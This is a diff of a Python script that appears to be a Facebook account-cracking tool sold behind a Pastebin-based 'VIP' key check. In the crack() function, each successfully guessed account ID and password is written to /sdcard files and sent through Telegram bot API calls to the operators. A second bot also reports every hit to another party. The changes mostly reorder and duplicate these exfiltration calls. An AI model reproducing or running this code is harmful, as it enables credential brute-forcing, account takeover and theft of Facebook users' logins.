@@ -1,3 +1,39 @@
+import requests
+import random
+import os
+import uuid
+import json
+import user_agent
+import time
+import sys
+import socket
+import datetime
+from datetime import date
+
+name = 'xdZwuHHS'  # تعريف المتغير name هنا
+
+def chk():
+    uuid = str(os.geteuid()) + str(os.getlogin())
+    id = "-".join(uuid)
+    print("   \x1b[1;38;5;121m[𝗬𝗢𝗨𝗥 𝗞𝗘𝗬]-[ مفتأحك ] : " + id)
+    try:
+        httpChat = requests.get("https://pastebin.com/raw/GTs1hmei").text
+        if id in httpChat:
+            print("   \x1b[38;5;161mتم التحقق بنجاح")
+            msg = str(os.geteuid())
+            time.sleep(1)
+            pass
+        else:
+            print("   \x1b[1;93m لم يتم العثور على اشتراكك vip خاص بك")
+            print("   \x1b[38;5;208mفضلاً قم بزيارة صفحة التواصل لل اشتراك في المدفوع [@R_A_J_Y-@K_L_D")
+            time.sleep(1)
+            sys.exit()
+    except Exception as e:
+        print("\033[1;30mخطأ ما حدث: ", e)
+        sys.exit()
+
+for _ in range(3):
+    chk()
 import os
 import requests
 import time
@@ -360,11 +396,6 @@ from bs4 import BeautifulSoup as sop
 import requests,bs4,json,os,sys,random,datetime,time
 from concurrent.futures import ThreadPoolExecutor as tred
 import threading
-import requests,os,sys,random, re
-from rich.console import Console as NETWORK_KURD
-from concurrent.futures import ThreadPoolExecutor as THREADING
-from rich.panel import Panel as ALOAN
-from rich import print as PRENTO
 CON=NETWORK_KURD() 
 ugen2=[]
 ugen=[]
@@ -393,6 +424,7 @@ ugen = [generate_user_agent_android_12() for _ in range(10000)]
 id, id2, loop, ok, cp, akun, oprek, method, taplikasi, uid = [], [], 0, 0, 0, [], [], [], [], []
 cokbrut = []
 pwpluss, pwnya = [], []
+x = ''
 os.system('clear')
 pretty.install()
 CON=sol()
@@ -5277,18 +5309,20 @@ def crack(idf,pwv):
 ﴾𝐕𝐈𝐏﴿﴾𝐔𝐑𝐋﴿ = https://www.facebook.com/profile.php?id={idf}\n
 ⋘━━━━━━━﴾𓆩𝐃𝐄𝐀𝐃𓆪﴿━━━━━━━⋙
 ➺𝐌𝐑•𝐃𝐄𝐕:-@R_A_J_Y @K_L_D'''
-				url = f"https://api.telegram.org/bot{kld}/sendVideo"
-				data = {
-				"chat_id": sos,
-				"video": "https://t.me/GGPPE/14",
-				"caption": ali
-				}
+				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(ali))
 				statuscp1 = nel(ali, style='red')
 				cetak(nel(statuscp1, title='CP'))
 				open('/sdcard/𝚁𝙾𝚁-𝙲𝙿.txt', 'a').write(idf+'|'+pw+'|'+joined+'\n')
 				cp+=1
 				akun.append(idf + '|' + pw)
-				
+				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(ali))
+				url = f"https://api.telegram.org/bot{kld}/sendVideo"
+				data = {
+				"chat_id": sos,
+				"video": "https://t.me/GGPPE/12",
+				"caption": ali
+				}
+				response = requests.post(url, data=data)
 				soso = f'''
 				صاحب الايدي صاد حساب (ID)'''
 				requests.get('https://api.telegram.org/bot' + str(moon) + '/sendMessage?chat_id=' + str(sun) + '&text=' + str(soso))
@@ -5306,16 +5340,18 @@ def crack(idf,pwv):
 ⋘━━━━━━━﴾𓆩𝐋𝐈𝐕𝐄𓆪﴿━━━━━━━⋙
 ➺𝐌𝐑•𝐃𝐄𝐕:@R_A_J_Y @K_L_D'''
 				cek_aya(kuki)
+				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(rajy))
+				statusok1 = nel(rajy, style='green')
+				cetak(nel(statusok1, title='OK'))
+				open('/sdcard/𝚁𝙾𝚁-𝙾𝙺.txt', 'a').write(idf+'|'+pw+'|'+joined+'\n')
+				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(rajy))
 				url = f"https://api.telegram.org/bot{kld}/sendVideo"
 				data = {
 				"chat_id": sos,
 				"video": "https://t.me/GGPPE/12",
 				"caption": rajy
 				}
-				response = requests.post(url, data=data)
-				statusok1 = nel(rajy, style='green')
-				cetak(nel(statusok1, title='OK'))
-				open('/sdcard/𝚁𝙾𝚁-𝙾𝙺.txt', 'a').write(idf+'|'+pw+'|'+joined+'\n')				
+				response = requests.post(url, data=data)				
 				sara = f'''
 				صاحب الايدي صاد حساب (ID)'''
 				requests.get('https://api.telegram.org/bot' + str(moon) + '/sendMessage?chat_id=' + str(sun) + '&text=' + str(sara))
